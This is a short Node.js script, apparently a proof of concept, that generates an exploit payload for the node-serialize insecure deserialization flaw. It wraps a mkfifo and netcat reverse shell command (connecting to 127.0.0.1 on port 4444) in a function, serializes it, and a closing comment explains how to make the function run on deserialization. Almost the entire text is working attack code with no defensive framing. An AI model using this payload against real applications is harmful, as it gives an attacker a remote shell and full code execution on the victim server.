var serialize = require('node-serialize');


testfunktion = {
test : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
  function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(testfunktion));


/*
append () after the function closing bracket
*/